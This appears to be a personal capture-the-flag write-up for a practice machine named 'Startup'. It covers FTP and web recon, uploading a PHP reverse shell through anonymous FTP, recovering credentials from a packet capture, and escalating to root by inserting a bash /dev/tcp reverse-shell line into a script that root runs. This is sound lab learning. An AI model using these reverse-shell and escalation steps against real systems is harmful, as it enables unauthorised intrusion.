# Startup

- Recon-stage
    1. Ran threader3000 on machine

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled.png)

    2. Ran the suggested Nmap Scan

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%201.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%201.png)

    From this we know that FTP is active and we can login as Anonmyous

    3. Ran a gobuster Scan

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%202.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%202.png)

- Initial Foothold

    Logged in via FTP server and looked around for intresting files

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%203.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%203.png)

    downloaded the notice.txt file using

    ```jsx
    get notice.txt
    ```

    and read that file..Nothing intresting was there tbh.

    Now went to the webserver and opened the folders we've seen before

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%204.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%204.png)

    Notice how we have same folder with same content, that is a way to get the foothold.

    We can upload in the [FTP](https://www.notion.so/FTP-a9fa1ce71cf643aea1000510320b0227) a [reverse-shel](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)l and access it.

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%205.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%205.png)

    we have to upload it in the `ftp` directory

    Now get a `nc` listener running on attacker machine and run the [reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) script.

    - There we go, we got a shell!

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%206.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%206.png)

    Now lets upload linpeas and run it.

    Linpeas showed some weird folders that were not supposed to be there on the system.

    In one of these folders there existed a `pcapng` file

    Download it to attacker machine to further investigate it

- Investigation of the pcap

    It is a packet capture file and it might contain information of users who have logged in before us.

    In this we are looking for `[PSH , ACK]` and we will follow that stream to further investigate.

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%207.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%207.png)

    - What is PSH Flag?

        `PSH` is a Push flag: [http://ask.wireshark.org/questions/20423/pshack-wireshark-capture](http://ask.wireshark.org/questions/20423/pshack-wireshark-capture)

        The Push flag tells the receiver's network stack to "push" the data
        straight to the receiving socket, and not to wait for any more packets
        before doing so.

        The Push flag usually means that data has been sent whilst overriding an in-built TCP efficiency delay, such as [Nagle's Algorithm](http://en.wikipedia.org/wiki/Nagle%27s_algorithm) or [Delayed Acknowledgements](http://en.wikipedia.org/wiki/TCP_delayed_acknowledgment).

        These delays make TCP networking more efficient at the cost of some
        latency (usually around a few tens of milliseconds). A latency-sensitive application does not want to wait around for TCP's efficiency delays so the application will usually disable them, causing data to be sent as
        quick as possible with a Push flag set.

    - What is ACK Flag?

        ACK is an acknowledgement Flag

    we got it!!

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%208.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%208.png)

- User Escalation

    We got the username and password for the `user` using pcap forensics, now login through ssh

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%209.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%209.png)

- Root Escalation

    Now we have a folder called scripts, lets see whats in there

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%2010.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%2010.png)

    We can see only root user can run/edit  [planner.sh](http://planner.sh), but everyone can open and see its contents.

    we have a bash script called `print.sh` 

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%2011.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%2011.png)

    we can edit this file as lennie

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%2012.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%2012.png)

    now putting a bash reverse shell script.

    ```jsx
    bash -c 'exec bash -i &>/dev/tcp/{yourip}/{port} <&1'
    ```

    and starting a `nc` listener from our end, we got root

    ![Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%2013.png](Startup%20f86d1e1f739d484b9836192defb55a16/Untitled%2013.png)

- Stuff i did which was not required
    1. Looked around for general CVE's suggested by linpeas
    2. Ran Kernel Exploit Suggester 2 and ran its suggested exploits like dirty cow and whatnot
    3. Failed in generating msfvenom script LOL